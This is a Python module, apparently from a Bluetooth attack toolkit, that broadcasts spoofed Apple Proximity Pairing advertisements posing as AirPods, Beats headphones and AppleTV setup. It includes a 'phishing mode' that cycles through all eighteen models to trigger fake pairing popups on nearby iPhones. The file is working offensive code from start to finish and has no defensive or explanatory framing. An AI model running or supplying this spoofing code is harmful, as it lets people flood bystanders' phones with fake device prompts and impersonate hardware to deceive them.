import time
import random
from core.hci_wrapper import start_le_advertising, stop_le_advertising, open_dev
from modules.reset import reset_adapter
from core.packet_builder import ProximityPairingPacket

class AdvertisingModule:
    DEVICE_DATA = {
        1: {"name": "AirPods"},
        2: {"name": "AirPods Pro"},
        3: {"name": "AirPods Max"},
        4: {"name": "AirPods Gen 2"},
        5: {"name": "AirPods Gen 3"},
        6: {"name": "AirPods Pro Gen 2"},
        7: {"name": "PowerBeats"},
        8: {"name": "PowerBeats Pro"},
        9: {"name": "Beats Solo Pro"},
        10: {"name": "Beats Studio Buds"},
        11: {"name": "Beats Flex"},
        12: {"name": "BeatsX"},
        13: {"name": "Beats Solo3"},
        14: {"name": "Beats Studio3"},
        15: {"name": "Beats Studio Pro"},
        16: {"name": "Beats Fit Pro"},
        17: {"name": "Beats Studio Buds+"},
        18: {"name": "AppleTV Setup"},
    }

    def __init__(self, dev_id=0, console=None):
        self.dev_id = dev_id
        self.sock = None
        self.console = console

    def log(self, message):
        if self.console:
            self.console.print(message)
        else:
            print(message)

    def start_spoof(self, interval_ms=200, custom_payload=None, model_name="AirPods", phishing_mode=False):
        if phishing_mode:
            self.log(f"[bold red][*] Starting PHISHING MODE ([white]Cycling all models[/white]) on hci{self.dev_id}...[/bold red]")
        else:
            self.log(f"[bold blue][*] Starting Spoofing ([white]{model_name}[/white]) on hci{self.dev_id}...[/bold blue]")
        
        self.sock = open_dev(self.dev_id)
        if not self.sock:
            return

        if phishing_mode:
            self.log(f"[red][*] PHISHING MODE ACTIVE. Cycling through all models. Look at your iPhone![/red]")
        else:
            self.log(f"[green][*] Broadcasting {model_name}. Look at your iPhone![/green]")
        self.log("[dim][*] Press Ctrl+C to stop.[/dim]")

        try:
            if self.console and phishing_mode:
                 with self.console.status("[bold red]PHISHING MODE: Cycling all models...[/bold red]", spinner="earth"):
                     self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
            elif self.console and not phishing_mode:
                 with self.console.status(f"[bold green]Broadcasting {model_name}...[/bold green]", spinner="earth"):
                     self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)
            else:
                 self._spoof_loop(interval_ms, custom_payload, model_name, phishing_mode)

        except KeyboardInterrupt:
            self.log("\n[yellow][*] Stopping Advertisement...[/yellow]")
            stop_le_advertising(self.sock)
        except Exception as e:
            self.log(f"[red][!] Error: {e}[/red]")

    def _spoof_loop(self, interval_ms, custom_payload, model_name, phishing_mode):
        while True:
            if phishing_mode:
                 keys = list(self.DEVICE_DATA.keys())
                 for k in keys:
                     m = self.DEVICE_DATA[k]['name']
                     packet_data = self.build_packet(m)
                     start_le_advertising(self.sock, min_interval=100, max_interval=100, data=packet_data)
                     time.sleep(2)
                     stop_le_advertising(self.sock)
                     time.sleep(0.1)
            else:
                packet_data = ()
                if custom_payload:
                    packet_data = custom_payload
                else:
                    packet_data = self.build_packet(model_name)
                    
                start_le_advertising(self.sock, min_interval=interval_ms, max_interval=interval_ms, data=packet_data)
                time.sleep(2)
                stop_le_advertising(self.sock)
                time.sleep(0.1)

    def build_packet(self, name):
        try:
             bat_left = random.randint(10, 100)
             bat_right = random.randint(10, 100)
             bat_case = random.randint(10, 100)
             return ProximityPairingPacket.build(
                 model_name=name,
                 battery_left=bat_left,
                 battery_right=bat_right,
                 battery_case=bat_case,
                 charging_left=False,
                 charging_right=False,
                 charging_case=False,
                 lid_open=True 
             )
        except:
             return (0x1e, 0xff, 0x4c, 0x00, 0x07) 